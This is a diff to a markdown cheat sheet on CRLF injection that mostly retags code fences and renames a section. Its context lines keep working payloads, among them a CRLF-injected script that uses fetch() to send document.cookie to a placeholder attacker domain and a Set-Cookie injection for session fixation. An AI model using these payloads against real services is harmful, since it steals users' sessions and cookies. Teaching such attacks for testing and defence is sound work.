@@ -1,9 +1,10 @@
 # CRLF Injection
 
 ## Table of Contents
+
 - [XSS](#xss)
 - [Session Fixation](#session-fixation)
-- [Cache Poisoning](#cache-poisoning)
+- [Chaining with Cache Poisoning](#chaining-with-cache-poisoning)
 
 ## XSS
 
@@ -11,7 +12,7 @@
 
 - Terminating the header section and writing the body
     1. Request
-        ```
+        ```text
         https://[VULNERABLE-SERVICE]/profile?lang=en%0d%0a%0d%0a%3Cscript%3Efetch('https://[ATTACKER-DOMAIN]/?c='%2Bdocument.cookie)%3C/script%3E
         ```
 
@@ -29,7 +30,7 @@
 
 - Fixing a session identifier
     1. Request
-        ```
+        ```text
         https://[VULNERABLE-SERVICE]/redirect?url=%0d%0aSet-Cookie:%20SESSIONID%3Dattacker_value
         ```
 
@@ -41,7 +42,7 @@
         ```
     The victim then authenticates under a session identifier the attacker already knows.
 
-## Cache Poisoning
+## Chaining with Cache Poisoning
 
 ### A self-targeted issue may escalate into one that affects every user served by the cache.
 
